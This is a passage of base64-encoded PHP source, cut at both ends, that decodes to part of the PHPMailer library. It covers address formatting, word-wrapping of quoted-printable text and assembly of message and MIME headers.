1cnJlbnQgbGFuZ3VhZ2UuCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRUcmFuc2xhdGlvbnMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+bGFuZ3VhZ2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgcmVjaXBpZW50IGhlYWRlcnMuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZQogICAgICogQHBhcmFtIGFycmF5ICRhZGRyIEFuIGFycmF5IG9mIHJlY2lwaWVudCwKICAgICAqIHdoZXJlIGVhY2ggcmVjaXBpZW50IGlzIGEgMi1lbGVtZW50IGluZGV4ZWQgYXJyYXkgd2l0aCBlbGVtZW50IDAgY29udGFpbmluZyBhbiBhZGRyZXNzCiAgICAgKiBhbmQgZWxlbWVudCAxIGNvbnRhaW5pbmcgYSBuYW1lLCBsaWtlOgogICAgICogYXJyYXkoYXJyYXkoJ2pvZUBleGFtcGxlLmNvbScsICdKb2UgVXNlcicpLCBhcnJheSgnem9lQGV4YW1wbGUuY29tJywgJ1pvZSBVc2VyJykpCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckFwcGVuZCgkdHlwZSwgJGFkZHIpCiAgICB7CiAgICAgICAgJGFkZHJlc3NlcyA9IGFycmF5KCk7CiAgICAgICAgZm9yZWFjaCAoJGFkZHIgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gJHRoaXMtPmFkZHJGb3JtYXQoJGFkZHJlc3MpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHR5cGUgLiAnOiAnIC4gaW1wbG9kZSgnLCAnLCAkYWRkcmVzc2VzKSAuICR0aGlzLT5MRTsKICAgIH0KCiAgICAvKioKICAgICAqIEZvcm1hdCBhbiBhZGRyZXNzIGZvciB1c2UgaW4gYSBtZXNzYWdlIGhlYWRlci4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gYXJyYXkgJGFkZHIgQSAyLWVsZW1lbnQgaW5kZXhlZCBhcnJheSwgZWxlbWVudCAwIGNvbnRhaW5pbmcgYW4gYWRkcmVzcywgZWxlbWVudCAxIGNvbnRhaW5pbmcgYSBuYW1lCiAgICAgKiAgICAgIGxpa2UgYXJyYXkoJ2pvZUBleGFtcGxlLmNvbScsICdKb2UgVXNlcicpCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckZvcm1hdCgkYWRkcikKICAgIHsKICAgICAgICBpZiAoZW1wdHkoJGFkZHJbMV0pKSB7IC8vIE5vIG5hbWUgcHJvdmlkZWQKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMF0pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMV0pLCAncGhyYXNlJykgLiAnIDwnIC4gJHRoaXMtPnNlY3VyZUhlYWRlcigKICAgICAgICAgICAgICAgICRhZGRyWzBdCiAgICAgICAgICAgICkgLiAnPic7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogV29yZC13cmFwIG1lc3NhZ2UuCiAgICAgKiBGb3IgdXNlIHdpdGggbWFpbGVycyB0aGF0IGRvIG5vdCBhdXRvbWF0aWNhbGx5IHBlcmZvcm0gd3JhcHBpbmcKICAgICAqIGFuZCBmb3IgcXVvdGVkLXByaW50YWJsZSBlbmNvZGVkIG1lc3NhZ2VzLgogICAgICogT3JpZ2luYWwgd3JpdHRlbiBieSBwaGlsaXBwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJG1lc3NhZ2UgVGhlIG1lc3NhZ2UgdG8gd3JhcAogICAgICogQHBhcmFtIGludGVnZXIgJGxlbmd0aCBUaGUgbGluZSBsZW5ndGggdG8gd3JhcCB0bwogICAgICogQHBhcmFtIGJvb2xlYW4gJHFwX21vZGUgV2hldGhlciB0byBydW4gaW4gUXVvdGVkLVByaW50YWJsZSBtb2RlCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHdyYXBUZXh0KCRtZXNzYWdlLCAkbGVuZ3RoLCAkcXBfbW9kZSA9IGZhbHNlKQogICAgewogICAgICAgIGlmICgkcXBfbW9kZSkgewogICAgICAgICAgICAkc29mdF9icmVhayA9IHNwcmludGYoJyA9JXMnLCAkdGhpcy0+TEUpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRzb2Z0X2JyZWFrID0gJHRoaXMtPkxFOwogICAgICAgIH0KICAgICAgICAvLyBJZiB1dGYtOCBlbmNvZGluZyBpcyB1c2VkLCB3ZSB3aWxsIG5lZWQgdG8gbWFrZSBzdXJlIHdlIGRvbid0CiAgICAgICAgLy8gc3BsaXQgbXVsdGlieXRlIGNoYXJhY3RlcnMgd2hlbiB3ZSB3cmFwCiAgICAgICAgJGlzX3V0ZjggPSAoc3RydG9sb3dlcigkdGhpcy0+Q2hhclNldCkgPT0gJ3V0Zi04Jyk7CiAgICAgICAgJGxlbGVuID0gc3RybGVuKCR0aGlzLT5MRSk7CiAgICAgICAgJGNybGZsZW4gPSBzdHJsZW4oc2VsZjo6Q1JMRik7CgogICAgICAgICRtZXNzYWdlID0gJHRoaXMtPmZpeEVPTCgkbWVzc2FnZSk7CiAgICAgICAgLy9SZW1vdmUgYSB0cmFpbGluZyBsaW5lIGJyZWFrCiAgICAgICAgaWYgKHN1YnN0cigkbWVzc2FnZSwgLSRsZWxlbikgPT0gJHRoaXMtPkxFKSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gc3Vic3RyKCRtZXNzYWdlLCAwLCAtJGxlbGVuKTsKICAgICAgICB9CgogICAgICAgIC8vU3BsaXQgbWVzc2FnZSBpbnRvIGxpbmVzCiAgICAgICAgJGxpbmVzID0gZXhwbG9kZSgkdGhpcy0+TEUsICRtZXNzYWdlKTsKICAgICAgICAvL01lc3NhZ2Ugd2lsbCBiZSByZWJ1aWx0IGluIGhlcmUKICAgICAgICAkbWVzc2FnZSA9ICcnOwogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAkbGluZSkgewogICAgICAgICAgICAkd29yZHMgPSBleHBsb2RlKCcgJywgJGxpbmUpOwogICAgICAgICAgICAkYnVmID0gJyc7CiAgICAgICAgICAgICRmaXJzdHdvcmQgPSB0cnVlOwogICAgICAgICAgICBmb3JlYWNoICgkd29yZHMgYXMgJHdvcmQpIHsKICAgICAgICAgICAgICAgIGlmICgkcXBfbW9kZSBhbmQgKHN0cmxlbigkd29yZCkgPiAkbGVuZ3RoKSkgewogICAgICAgICAgICAgICAgICAgICRzcGFjZV9sZWZ0ID0gJGxlbmd0aCAtIHN0cmxlbigkYnVmKSAtICRjcmxmbGVuOwogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHNwYWNlX2xlZnQgPiAyMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRzcGFjZV9sZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAxLCAxKSA9PSAnPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuLS07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMiwgMSkgPT0gJz0nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiAtPSAyOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHdvcmQgPSBzdWJzdHIoJHdvcmQsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICcgLiAkcGFydDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiBzcHJpbnRmKCc9JXMnLCBzZWxmOjpDUkxGKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiAkc29mdF9icmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkYnVmID0gJyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHdoaWxlIChzdHJsZW4oJHdvcmQpID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGxlbmd0aCA8PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJGxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJHRoaXMtPnV0ZjhDaGFyQm91bmRhcnkoJHdvcmQsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMSwgMSkgPT0gJz0nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuLS07CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAyLCAxKSA9PSAnPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gLT0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN1YnN0cigkd29yZCwgMCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgICR3b3JkID0gc3Vic3RyKCR3b3JkLCAkbGVuKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJHdvcmQpID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJHBhcnQgLiBzcHJpbnRmKCc9JXMnLCBzZWxmOjpDUkxGKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkcGFydDsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGJ1Zl9vID0gJGJ1ZjsKICAgICAgICAgICAgICAgICAgICBpZiAoISRmaXJzdHdvcmQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRidWYgLj0gJHdvcmQ7CgogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGJ1ZikgPiAkbGVuZ3RoIGFuZCAkYnVmX28gIT0gJycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1Zl9vIC4gJHNvZnRfYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkd29yZDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkZmlyc3R3b3JkID0gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuIHNlbGY6OkNSTEY7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJG1lc3NhZ2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBGaW5kIHRoZSBsYXN0IGNoYXJhY3RlciBib3VuZGFyeSBwcmlvciB0byAkbWF4TGVuZ3RoIGluIGEgdXRmLTgKICAgICAqIHF1b3RlZC1wcmludGFibGUgZW5jb2RlZCBzdHJpbmcuCiAgICAgKiBPcmlnaW5hbCB3cml0dGVuIGJ5IENvbGluIEJyb3duLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kZWRUZXh0IHV0Zi04IFFQIHRleHQKICAgICAqIEBwYXJhbSBpbnRlZ2VyICRtYXhMZW5ndGggRmluZCB0aGUgbGFzdCBjaGFyYWN0ZXIgYm91bmRhcnkgcHJpb3IgdG8gdGhpcyBsZW5ndGgKICAgICAqIEByZXR1cm4gaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gdXRmOENoYXJCb3VuZGFyeSgkZW5jb2RlZFRleHQsICRtYXhMZW5ndGgpCiAgICB7CiAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSBmYWxzZTsKICAgICAgICAkbG9va0JhY2sgPSAzOwogICAgICAgIHdoaWxlICghJGZvdW5kU3BsaXRQb3MpIHsKICAgICAgICAgICAgJGxhc3RDaHVuayA9IHN1YnN0cigkZW5jb2RlZFRleHQsICRtYXhMZW5ndGggLSAkbG9va0JhY2ssICRsb29rQmFjayk7CiAgICAgICAgICAgICRlbmNvZGVkQ2hhclBvcyA9IHN0cnBvcygkbGFzdENodW5rLCAnPScpOwogICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRlbmNvZGVkQ2hhclBvcykgewogICAgICAgICAgICAgICAgLy8gRm91bmQgc3RhcnQgb2YgZW5jb2RlZCBjaGFyYWN0ZXIgYnl0ZSB3aXRoaW4gJGxvb2tCYWNrIGJsb2NrLgogICAgICAgICAgICAgICAgLy8gQ2hlY2sgdGhlIGVuY29kZWQgYnl0ZSB2YWx1ZSAodGhlIDIgY2hhcnMgYWZ0ZXIgdGhlICc9JykKICAgICAgICAgICAgICAgICRoZXggPSBzdWJzdHIoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoIC0gJGxvb2tCYWNrICsgJGVuY29kZWRDaGFyUG9zICsgMSwgMik7CiAgICAgICAgICAgICAgICAkZGVjID0gaGV4ZGVjKCRoZXgpOwogICAgICAgICAgICAgICAgaWYgKCRkZWMgPCAxMjgpIHsKICAgICAgICAgICAgICAgICAgICAvLyBTaW5nbGUgYnl0ZSBjaGFyYWN0ZXIuCiAgICAgICAgICAgICAgICAgICAgLy8gSWYgdGhlIGVuY29kZWQgY2hhciB3YXMgZm91bmQgYXQgcG9zIDAsIGl0IHdpbGwgZml0CiAgICAgICAgICAgICAgICAgICAgLy8gb3RoZXJ3aXNlIHJlZHVjZSBtYXhMZW5ndGggdG8gc3RhcnQgb2YgdGhlIGVuY29kZWQgY2hhcgogICAgICAgICAgICAgICAgICAgIGlmICgkZW5jb2RlZENoYXJQb3MgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtYXhMZW5ndGggPSAkbWF4TGVuZ3RoIC0gKCRsb29rQmFjayAtICRlbmNvZGVkQ2hhclBvcyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkZGVjID49IDE5MikgewogICAgICAgICAgICAgICAgICAgIC8vIEZpcnN0IGJ5dGUgb2YgYSBtdWx0aSBieXRlIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIC8vIFJlZHVjZSBtYXhMZW5ndGggdG8gc3BsaXQgYXQgc3RhcnQgb2YgY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgJG1heExlbmd0aCA9ICRtYXhMZW5ndGggLSAoJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zKTsKICAgICAgICAgICAgICAgICAgICAkZm91bmRTcGxpdFBvcyA9IHRydWU7CiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGRlYyA8IDE5MikgewogICAgICAgICAgICAgICAgICAgIC8vIE1pZGRsZSBieXRlIG9mIGEgbXVsdGkgYnl0ZSBjaGFyYWN0ZXIsIGxvb2sgZnVydGhlciBiYWNrCiAgICAgICAgICAgICAgICAgICAgJGxvb2tCYWNrICs9IDM7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAvLyBObyBlbmNvZGVkIGNoYXJhY3RlciBmb3VuZAogICAgICAgICAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkbWF4TGVuZ3RoOwogICAgfQoKICAgIC8qKgogICAgICogQXBwbHkgd29yZCB3cmFwcGluZyB0byB0aGUgbWVzc2FnZSBib2R5LgogICAgICogV3JhcHMgdGhlIG1lc3NhZ2UgYm9keSB0byB0aGUgbnVtYmVyIG9mIGNoYXJzIHNldCBpbiB0aGUgV29yZFdyYXAgcHJvcGVydHkuCiAgICAgKiBZb3Ugc2hvdWxkIG9ubHkgZG8gdGhpcyB0byBwbGFpbi10ZXh0IGJvZGllcyBhcyB3cmFwcGluZyBIVE1MIHRhZ3MgbWF5IGJyZWFrIHRoZW0uCiAgICAgKiBUaGlzIGlzIGNhbGxlZCBhdXRvbWF0aWNhbGx5IGJ5IGNyZWF0ZUJvZHkoKSwgc28geW91IGRvbid0IG5lZWQgdG8gY2FsbCBpdCB5b3Vyc2VsZi4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldFdvcmRXcmFwKCkKICAgIHsKICAgICAgICBpZiAoJHRoaXMtPldvcmRXcmFwIDwgMSkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKICAgICAgICAgICAgY2FzZSAnYWx0JzoKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT53cmFwVGV4dCgkdGhpcy0+QWx0Qm9keSwgJHRoaXMtPldvcmRXcmFwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgJHRoaXMtPkJvZHkgPSAkdGhpcy0+d3JhcFRleHQoJHRoaXMtPkJvZHksICR0aGlzLT5Xb3JkV3JhcCk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBBc3NlbWJsZSBtZXNzYWdlIGhlYWRlcnMuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGFzc2VtYmxlZCBoZWFkZXJzCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGVIZWFkZXIoKQogICAgewogICAgICAgICRyZXN1bHQgPSAnJzsKCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnRGF0ZScsICR0aGlzLT5NZXNzYWdlRGF0ZSA9PSAnJyA/IHNlbGY6OnJmY0RhdGUoKSA6ICR0aGlzLT5NZXNzYWdlRGF0ZSk7CgogICAgICAgIC8vIFRvIGJlIGNyZWF0ZWQgYXV0b21hdGljYWxseSBieSBtYWlsKCkKICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvKSB7CiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgewogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0b2FkZHIpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U2luZ2xlVG9BcnJheVtdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPnRvKSA+IDApIHsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgewogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ1RvJywgJHRoaXMtPnRvKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlaWYgKGNvdW50KCR0aGlzLT5jYykgPT0gMCkgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnVG8nLCAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7Jyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0Zyb20nLCBhcnJheShhcnJheSh0cmltKCR0aGlzLT5Gcm9tKSwgJHRoaXMtPkZyb21OYW1lKSkpOwoKICAgICAgICAvLyBzZW5kbWFpbCBhbmQgbWFpbCgpIGV4dHJhY3QgQ2MgZnJvbSB0aGUgaGVhZGVyIGJlZm9yZSBzZW5kaW5nCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5jYykgPiAwKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0NjJywgJHRoaXMtPmNjKTsKICAgICAgICB9CgogICAgICAgIC8vIHNlbmRtYWlsIGFuZCBtYWlsKCkgZXh0cmFjdCBCY2MgZnJvbSB0aGUgaGVhZGVyIGJlZm9yZSBzZW5kaW5nCiAgICAgICAgaWYgKCgKICAgICAgICAgICAgICAgICR0aGlzLT5NYWlsZXIgPT0gJ3NlbmRtYWlsJyBvciAkdGhpcy0+TWFpbGVyID09ICdxbWFpbCcgb3IgJHRoaXMtPk1haWxlciA9PSAnbWFpbCcKICAgICAgICAgICAgKQogICAgICAgICAgICBhbmQgY291bnQoJHRoaXMtPmJjYykgPiAwCiAgICAgICAgKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0JjYycsICR0aGlzLT5iY2MpOwogICAgICAgIH0KCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5SZXBseVRvKSA+IDApIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnUmVwbHktVG8nLCAkdGhpcy0+UmVwbHlUbyk7CiAgICAgICAgfQoKICAgICAgICAvLyBtYWlsKCkgc2V0cyB0aGUgc3ViamVjdCBpdHNlbGYKICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnU3ViamVjdCcsICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpKTsKICAgICAgICB9CgogICAgICAgIC8vIE9ubHkgYWxsb3cgYSBjdXN0b20gbWVzc2FnZSBJRCBpZiBpdCBjb25mb3JtcyB0byBSRkMgNTMyMiBzZWN0aW9uIDMuNi40CiAgICAgICAgLy8gaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUzMjIjc2VjdGlvbi0zLjYuNAogICAgICAgIGlmICgnJyAhPSAkdGhpcy0+TWVzc2FnZUlEIGFuZCBwcmVnX21hdGNoKCcvXjwuKkAuKj4kLycsICR0aGlzLT5NZXNzYWdlSUQpKSB7CiAgICAgICAgICAgICR0aGlzLT5sYXN0TWVzc2FnZUlEID0gJHRoaXMtPk1lc3NhZ2VJRDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+bGFzdE1lc3NhZ2VJRCA9IHNwcmludGYoJzwlc0Alcz4nLCAkdGhpcy0+dW5pcXVlaWQsICR0aGlzLT5zZXJ2ZXJIb3N0bmFtZSgpKTsKICAgICAgICB9CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnTWVzc2FnZS1JRCcsICR0aGlzLT5sYXN0TWVzc2FnZUlEKTsKICAgICAgICBpZiAoIWlzX251bGwoJHRoaXMtPlByaW9yaXR5KSkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdYLVByaW9yaXR5JywgJHRoaXMtPlByaW9yaXR5KTsKICAgICAgICB9CiAgICAgICAgaWYgKCR0aGlzLT5YTWFpbGVyID09ICcnKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoCiAgICAgICAgICAgICAgICAnWC1NYWlsZXInLAogICAgICAgICAgICAgICAgJ1BIUE1haWxlciAnIC4gJHRoaXMtPlZlcnNpb24gLiAnIChodHRwczovL2dpdGh1Yi5jb20vUEhQTWFpbGVyL1BIUE1haWxlciknCiAgICAgICAgICAgICk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJG15WG1haWxlciA9IHRyaW0oJHRoaXMtPlhNYWlsZXIpOwogICAgICAgICAgICBpZiAoJG15WG1haWxlcikgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnWC1NYWlsZXInLCAkbXlYbWFpbGVyKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKCR0aGlzLT5Db25maXJtUmVhZGluZ1RvICE9ICcnKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0Rpc3Bvc2l0aW9uLU5vdGlmaWNhdGlvbi1UbycsICc8JyAuICR0aGlzLT5Db25maXJtUmVhZGluZ1RvIC4gJz4nKTsKICAgICAgICB9CgogICAgICAgIC8vIEFkZCBjdXN0b20gaGVhZGVycwogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5DdXN0b21IZWFkZXIgYXMgJGhlYWRlcikgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKAogICAgICAgICAgICAgICAgdHJpbSgkaGVhZGVyWzBdKSwKICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIodHJpbSgkaGVhZGVyWzFdKSkKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+c2lnbl9rZXlfZmlsZSkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdNSU1FLVZlcnNpb24nLCAnMS4wJyk7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmdldE1haWxNSU1FKCk7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgbWVzc2FnZSBNSU1FIHR5cGUgaGVhZGVycy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0TWFpbE1JTUUoKQogICAgewogICAgICAgICRyZXN1bHQgPSAnJzsKICAgICAgICAkaXNtdWx0aXBhcnQgPSB0cnVlOwogICAgICAgIHN3aXRjaCAoJHRoaXMtPm1lc3NhZ2VfdHlwZSkgewogICAgICAgICAgICBjYXNlICdpbmxpbmUnOgogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOwogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhdHRhY2gnOgogICAgICAgICAgICBjYXNlICdpbmxpbmVfYXR0YWNoJzoKICAgICAgICAgICAgY2FzZSAnYWx0X2F0dGFjaCc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmVfYXR0YWNoJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvbWl4ZWQ7Jyk7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMV0gLiAnIicpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2FsdCc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF